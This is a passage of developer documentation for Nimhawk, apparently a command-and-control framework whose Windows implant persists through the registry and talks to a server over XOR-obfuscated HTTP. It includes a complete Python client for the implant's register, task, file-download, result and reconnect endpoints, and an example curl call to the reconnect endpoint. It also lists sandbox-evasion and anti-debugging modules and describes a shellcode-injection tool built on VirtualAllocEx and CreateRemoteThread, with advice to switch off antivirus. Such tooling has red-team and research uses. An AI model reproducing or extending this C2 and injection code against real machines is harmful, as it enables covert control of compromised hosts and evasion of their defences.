1. **Registry Storage**:
   - Implant encrypted ID is stored in Windows registry during initial registration
   - Acts as a mutex to prevent multiple implants running in same machine
   - Ensure encrypted communication after system reboots and process restarts

2. **XOR Key Recovery Scenario**:
   - Implant UNIQUE_XOR_KEY generated after implant registration is stored in memory, so if implant die, key will lost after process termination or system reboot
   - Reconnect endpoint provides new XOR key to restart secure communication between server and implant.

3. **Reconnection Process**:
   - Implant reads encrypted ID from registry
   - Decrypts the ID for use in communication
   - Sends OPTIONS request with decrypted ID in X-Request-ID header
   - Server validates ID and returns new XOR key
   - Implant updates encryption key in memory
   - Communication resumes with new secure key

**Example CURL**:
```bash
curl -X OPTIONS "http://server:port/reconnect" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko" \
  -H "X-Correlation-ID: PASIOnodnoqonasond12314"
  -H "X-Request-ID: <decrypted_implant_id>" \
```



**Security Considerations**:
- Registry storage provides persistence without file system artifacts
- ID is encrypted in registry but sent decrypted in X-Request-ID header
- XOR key rotation on reconnection enhances security
- Authentication required for reconnection requests
- Prevents unauthorized implants from reconnecting
- Maintains secure communication after system reboots

**Error Handling**:
- Invalid ID returns 404 Not Found
- Authentication failure returns 401 Unauthorized
- Inactive implant returns 410 Gone
- Server errors return 500 Internal Server Error

**Use Cases**:
1. System Reboot:
   - Implant restarts and reads encrypted ID from registry
   - Decrypts ID and requests new XOR key via reconnect
   - Resumes secure communication

2. Process Restart:
   - Implant process terminates and restarts
   - Encrypted registry ID prevents duplicate instances
   - New XOR key obtained for continued operation

---------------------------------------------------------------------------------------------


## Test Script

Below is a Python script to test all endpoints. Save it in `dev_utils/test_implant_api.py`:

```python
import base64
import sys
import os
import json
import requests
import zlib
from pathlib import Path
from typing import Dict, Any, Optional

class ImplantAPITester:
    def __init__(self, base_url: str, workspace_uuid: Optional[str] = None):
        self.base_url = base_url.rstrip('/')
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko',
            'X-Correlation-ID': 'PASIOnodnoqonasond12314',
            'Content-Type': 'application/json'
        }
        if workspace_uuid:
            self.headers['X-Robots-Tag'] = workspace_uuid
            
        self.implant_id = None
        self.unique_xor_key = None
        self.initial_xor_key = None
        
        # Read INITIAL_XOR_KEY from .xorkey file
        try:
            with open('.xorkey', 'r') as f:
                self.initial_xor_key = int(f.read().strip())
        except FileNotFoundError:
            print("Error: .xorkey file not found")
            sys.exit(1)
        except ValueError:
            print("Error: Key in .xorkey must be an integer")
            sys.exit(1)

    def xor_encrypt(self, data: str, key: int) -> str:
        """XOR encrypt data with key and return base64"""
        encrypted = ''.join(chr(ord(c) ^ key) for c in data)
        return base64.b64encode(encrypted.encode()).decode()

    def xor_decrypt(self, data: str, key: int) -> str:
        """Decode base64 and XOR decrypt data"""
        decoded = base64.b64decode(data.encode()).decode()
        return ''.join(chr(ord(c) ^ key) for c in decoded)

    def register(self) -> Dict[str, Any]:
        """Initial registration request using INITIAL_XOR_KEY"""
        print("\nRegistering new implant...")
        response = requests.get(
            f"{self.base_url}/register",
            headers=self.headers
        )
        
        if response.status_code == 200:
            data = response.json()
            self.implant_id = data['id']
            self.unique_xor_key = int(base64.b64decode(data['k']).decode())
            self.headers['X-Request-ID'] = self.implant_id
            print(f"Got implant ID: {self.implant_id}")
            print(f"Got UNIQUE_XOR_KEY: {self.unique_xor_key}")
            
        return response.json()

    def activate(self, system_info: Dict[str, Any]) -> Dict[str, Any]:
        """Activate implant with system information using UNIQUE_XOR_KEY"""
        if not self.unique_xor_key:
            raise Exception("Must register first to get UNIQUE_XOR_KEY")
            
        encrypted_data = self.xor_encrypt(json.dumps(system_info), self.unique_xor_key)
        
        print("\nActivating implant...")
        response = requests.post(
            f"{self.base_url}/register",
            headers=self.headers,
            json={'data': encrypted_data}
        )
        
        return response.json()

    def get_task(self) -> Dict[str, Any]:
        """Get pending tasks using UNIQUE_XOR_KEY"""
        if not self.unique_xor_key:
            raise Exception("Must register first to get UNIQUE_XOR_KEY")
            
        print("\nChecking for tasks...")
        response = requests.get(
            f"{self.base_url}/task",
            headers=self.headers
        )
        
        if response.status_code == 200:
            encrypted_data = response.json().get('data')
            if encrypted_data:
                decrypted = self.xor_decrypt(encrypted_data, self.unique_xor_key)
                return json.loads(decrypted)
        return response.json()

    def download_file(self, file_id: str, task_guid: str) -> bytes:
        """Download and process file from server"""
        if not self.unique_xor_key:
            raise Exception("Must register first to get UNIQUE_XOR_KEY")
            
        headers = self.headers.copy()
        headers['Content-MD5'] = task_guid
        
        print(f"\nDownloading file {file_id}...")
        response = requests.get(
            f"{self.base_url}/task/{file_id}",
            headers=headers
        )
        
        if response.status_code == 200:
            # Get encrypted filename from header
            enc_filename = response.headers.get('X-Original-Filename')
            if enc_filename:
                filename = self.xor_decrypt(enc_filename, self.unique_xor_key)
                print(f"Original filename: {filename}")
            
            # Process file content
            content = base64.b64decode(response.content)
            decrypted = self.xor_decrypt(content.decode(), self.unique_xor_key)
            decompressed = zlib.decompress(decrypted.encode())
            return decompressed
        
        return response.content

    def submit_result(self, task_guid: str, result: str) -> Dict[str, Any]:
        """Submit command execution result using UNIQUE_XOR_KEY"""
        if not self.unique_xor_key:
            raise Exception("Must register first to get UNIQUE_XOR_KEY")
            
        data = {
            'guid': task_guid,
            'result': base64.b64encode(result.encode()).decode()
        }
        encrypted_data = self.xor_encrypt(json.dumps(data), self.unique_xor_key)
        
        print("\nSubmitting result...")
        response = requests.post(
            f"{self.base_url}/result",
            headers=self.headers,
            json={'data': encrypted_data}
        )
        return response.json()

    def reconnect(self) -> Dict[str, Any]:
        """Test reconnection flow using INITIAL_XOR_KEY for registry ID"""
        if not self.implant_id:
            raise Exception("Must register first to get implant ID")
            
        # Simulate reading encrypted ID from registry
        enc_id = self.xor_encrypt(self.implant_id, self.initial_xor_key)
        # Decrypt ID for X-Request-ID header
        dec_id = self.xor_decrypt(enc_id, self.initial_xor_key)
        
        headers = self.headers.copy()
        headers['X-Request-ID'] = dec_id
        
        print("\nTesting reconnection...")
        response = requests.options(
            f"{self.base_url}/reconnect",
            headers=headers
        )
        
        if response.status_code == 200:
            # Update UNIQUE_XOR_KEY
            data = response.json()
            new_key = base64.b64decode(data['k']).decode()
            self.unique_xor_key = int(new_key)
            print(f"Got new UNIQUE_XOR_KEY: {self.unique_xor_key}")
        elif response.status_code == 410:
            print("Implant marked as inactive")
        
        return response.json()

def main():
    if len(sys.argv) < 3:
        print("Usage: python test_implant_routes.py <endpoint> <server_url> [workspace_uuid]")
        print("\nAvailable endpoints:")
        print("  register")
        print("  task")
        print("  download <file_id> <task_guid>")
        print("  result <task_guid> <result>")
        print("  reconnect")
        sys.exit(1)

    endpoint = sys.argv[1]
    server_url = sys.argv[2]
    workspace_uuid = sys.argv[3] if len(sys.argv) > 3 else None
    
    tester = ImplantAPITester(server_url, workspace_uuid)

    if endpoint == "register":
        # Test full registration flow
        tester.register()
        system_info = {
            "i": "192.168.1.100",
            "u": "testuser",
            "h": "TEST-PC",
            "o": "Windows 10",
            "p": 1234,
            "P": "test.exe",
            "r": True
        }
        tester.activate(system_info)
    
    elif endpoint == "task":
        tester.register()  # Need to register first
        tester.get_task()
    
    elif endpoint == "download":
        if len(sys.argv) < 5:
            print("Error: download requires <file_id> and <task_guid>")
            sys.exit(1)
        tester.register()  # Need to register first
        content = tester.download_file(sys.argv[3], sys.argv[4])
        print(f"Downloaded content length: {len(content)} bytes")
    
    elif endpoint == "result":
        if len(sys.argv) < 5:
            print("Error: result requires <task_guid> and <result>")
            sys.exit(1)
        tester.register()  # Need to register first
        tester.submit_result(sys.argv[3], sys.argv[4])
    
    elif endpoint == "reconnect":
        tester.register()  # Need to register first
        tester.reconnect()
    
    else:
        print(f"Error: Unknown endpoint: {endpoint}")
        sys.exit(1)

if __name__ == "__main__":
    main()
```

To use the test script:

1. Save it as `test_implant_routes.py`
2. Create a `.xorkey` file with the XOR key (or it will use the default)
3. Run with: `python test_implant_routes.py`

The script provides a complete test suite for all implant API endpoints and can be used as a reference for implementing new features or modifying existing ones.

## Pull request process

1. Ensure your code works locally
2. Run tests to verify you're not introducing regressions
3. Document the changes made
4. Submit a PR with a clear description of the purpose
5. Respond to review comments

## Implant Core Components

### 1. Main Entry Point (NimPlant.nim)

The main entry point for the implant is `NimPlant.nim`, which handles:
- Initialization of core components
- Registry persistence
- Communication setup
- Command execution loop

### 2. Package Configuration (implant.nimble)

The `implant.nimble` file defines:
- Package dependencies
- Compilation flags
- Build configuration
- Cross-compilation settings

### 3. Compiler Configuration (nim.cfg)

The `nim.cfg` file contains:
- Cross-compilation settings for Windows
- Optimization flags
- Debug settings
- Path configurations

### 4. Core Modules

#### Self Protection (selfProtections/)
- Anti-debugging mechanisms
- Process injection detection
- Sandbox evasion
- Memory protection

#### Utility Modules (util/)
- Encryption utilities
- Network operations
- File system operations
- System information gathering

#### Core Functionality (core/)
- Command parsing
- Task execution
- Result handling
- Communication protocols

#### Configuration (config/)
- Parameter parsing
- Environment setup
- Runtime configuration
- Security settings

## Server Architecture

### 1. Main Server (main.py)

The main server entry point handles:
- Server initialization
- Configuration loading
- Component startup
- Error handling

### 2. Admin Web Interface (admin_web_ui/)

The web interface includes:
- React/Next.js components
- Mantine UI framework
- Authentication system
- Real-time updates

### 3. Server Components (src/)

#### Admin API (src/servers/admin_api/)
- User management
- Command queuing
- File handling
- Session management

#### Implant API (src/servers/implants_api/)
- Implant registration
- Task delivery
- Result processing
- Reconnection handling

### 4. File Management

#### Uploads (uploads/)
- Temporary storage for files
- File validation
- Security checks
- Cleanup procedures

#### Downloads (downloads/)
- Implant file storage
- Access control
- File organization
- Retention policies

#### Logs (logs/)
- Server logging
- Implant activity
- Error tracking
- Audit trails

## Database Management

### 1. Database Schema (nimhawk.db)

The SQLite database stores:
- Implant information
- User accounts
- Command history
- File hash correlation and metadata

## Development Utilities

The `dev_utils/` directory contains several tools to help with development and testing:

### 1. test_implant_routes.py
A comprehensive testing tool for the implant communication protocol. This script allows you to:
- Test all implant API endpoints
- Simulate implant registration and activation
- Verify command execution flows
- Test file upload/download functionality
- Validate reconnection mechanisms

Usage:
```bash
python test_implant_routes.py <endpoint> <server_url> [workspace_uuid]

Available endpoints:
  register    # Test implant registration flow
  task        # Test task retrieval
  download    # Test file download (requires file_id and task_guid)
  result      # Test result submission
  reconnect   # Test reconnection mechanism
```

### 2. create_demo_implants.py
A utility script for generating test implants with various configurations. Features:
- Creates implants with different settings
- Tests compilation process
- Validates configuration parameters
- Helps verify build system functionality

Usage:
```bash
python create_demo_implants.py [options]
```

### 3. pe_injector_test/
- Basic PE memory injection for Windows x64 targets
- VirtualAllocEx/WriteProcessMemory/CreateRemoteThread technique
- Command-line interface for PID and shellcode specification
- Error handling and resource cleanup
- It's help full to test Nimhawk shellcode generation

**Technical Implementation:**
```nim
# Compile with:
nim c -f --os:windows --cpu:amd64 -d:binary injector.nim
```

**Key Components:**
1. **Shellcode Loading**
   - File-based shellcode reading
   - Byte sequence conversion
   - Error handling for file operations

2. **Injection Process**
   - Process handle acquisition
   - Remote memory allocation (PAGE_EXECUTE_READWRITE)
   - Memory writing with validation
   - Remote thread creation for execution

**Usage Example:**
```bash
injector.exe <target_pid> <shellcode_file_path>
```

This implementation serves as a testing tool for:
- Validating memory injection techniques
- Testing process manipulation capabilities
- Verifying shellcode execution flows
- Debugging injection-related features

Note: This tool is intended strictly for development and testing purposes. It uses a basic injection technique that is likely to be detected by most security solutions. For proper testing, ensure Windows Defender and other antivirus software are disabled.

## A Note on Learning

```bash
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⠤⠐⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡌⡦⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⣼⡊⢀⠔⠀⠀⣄⠤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⣄⣀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣶⠃⠉⠡⡠⠤⠊⠀⠠⣀⣀⡠⠔⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⢟⠿⠛⠛⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡇⠀⠀⠀⠀⠑⠶⠖⠊⠁⠀⠀⠀⡀⠀⠀⠀⢀⣠⣤⣤⡀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣿⣿⠟⡱⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣾⣿⡇⠀⢀⡠⠀⠀⠀⠈⠑⢦⣄⣀⣀⣽⣦⣤⣾⣿⠿⠿⠿⣿⡆⠀⠀⢀⠺⣿⣿⣿⣿⡿⠁⡰⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣧⣠⠊⣠⣶⣾⣿⣿⣶⣶⣿⣿⠿⠛⢿⣿⣫⢕⡠⢥⣈⠀⠙⠀⠰⣷⣿⣿⣿⡿⠋⢀⠜⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⢿⣿⣿⣿⣿⣰⣿⣿⠿⣛⡛⢛⣿⣿⣟⢅⠀⠀⢿⣿⠕⢺⣿⡇⠩⠓⠂⢀⠛⠛⠋⢁⣠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠘⢶⡶⢶⣶⣦⣤⣤⣤⣤⣤⣀⣀⣀⣀⡀⠀⠘⣿⣿⣿⠟⠁⡡⣒⣬⢭⢠⠝⢿⡡⠂⠀⠈⠻⣯⣖⣒⣺⡭⠂⢀⠈⣶⣶⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠙⠳⣌⡛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣻⣵⣨⣿⣿⡏⢀⠪⠎⠙⠿⣋⠴⡃⢸⣷⣤⣶⡾⠋⠈⠻⣶⣶⣶⣷⣶⣷⣿⣟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠛⢦⣌⡙⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠩⠭⡭⠴⠊⢀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⡇⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠙⠓⠦⣄⡉⠛⠛⠻⢿⣿⣿⣿⣷⡀⠀⠀⠀⠀⢀⣰⠋⠀⠀⠀⠀⠀⣀⣰⠤⣳⣿⣿⣿⣿⣟⠑⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠒⠒⠶⢺⣿⣿⣿⣿⣦⣄⣀⣴⣿⣯⣤⣔⠒⠚⣒⣉⣉⣴⣾⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠹⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣭⣉⣉⣤⣿⣿⣿⣿⣿⣿⡿⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⡁⡆⠙⢶⣀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣴⣶⣾⣿⣟⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢛⣩⣴⣿⠇⡇⠸⡆⠙⢷⣄⠻⣿⣦⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣎⢻⣿⣿⣿⣿⣿⣿⣿⣭⣭⣭⣵⣶⣾⣿⣿⣿⠟⢰⢣⠀⠈⠀⠀⠙⢷⡎⠙⣿⣦⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⡆⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠟⠛⠋⠁⢀⠇⢸⡇⠀⠀⠀⠀⠈⠁⠀⢸⣿⡆⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡜⡿⡘⣿⣿⣿⣿⣿⣶⣶⣤⣤⣤⣤⣤⣤⣤⣴⡎⠖⢹⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⡄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠛⠋⡟⠀⠀⣸⣷⣀⣤⣀⣀⣀⣤⣤⣾⣿⣿⣿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣭⣓⡲⠬⢭⣙⡛⠿⣿⣿⣶⣦⣀⠀⡜⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣭⣛⣓⠶⠦⠥⣀⠙⠋⠉⠉⠻⣄⣀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣆⠐⣦⣠⣷⠊⠁⠀⠀⡭⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢉⣛⡛⢻⡗⠂⠀⢀⣷⣄⠈⢆⠉⠙⠻⢿⣿⣿⣿⣿⣿⠇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⡟⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣉⢁⣴⣿⣿⣿⣾⡇⢀⣀⣼⡿⣿⣷⡌⢻⣦⡀⠀⠈⠙⠛⠿⠏⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⡄⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠛⠛⢯⡉⠉⠉⠉⠉⠛⢼⣿⠿⠿⠦⡙⣿⡆⢹⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠿⠄⠈⠻⠿⠿⠿⠿⠿⠿⠛⠛⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠻⠿⠿⠿⠿⠟⠉⠀⠀⠤⠴⠶⠌⠿⠘⠿⠿⠿⠿⠶⠤⠀⠀⠀⠀


            Guide you, no longer I can. Yours, the path now is!
            Code, you must contribute, little padawan.             
```

This documentation provides the foundations needed to get started with Nimhawk, but intentionally leaves room for discovery. Like a well-crafted game, it gives you the basic tutorial while letting you discover advanced mechanics on your own.

Why? Because:
- The best learning comes from exploration
- Understanding comes from reading code
- Discovery makes the journey more rewarding
- Security tools require deep comprehension

So dive in, explore the code, and find your own path. The real magic of Nimhawk lies in the journey of discovery.

Remember: Reading code is a skill, and this project is designed to help you develop it.


## Support the Project

If you find **Nimhawk** useful in your work or work / research, consider supporting its development!  
Contributions are always welcome — whether it's through code, ideas, or simply helping spread the word.  

And hey, if coding isn't your thing, feel free to send a beer, you know, every bit helps keep the project going!

[![Buy Me A Coffee](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/hdbreaker9s)

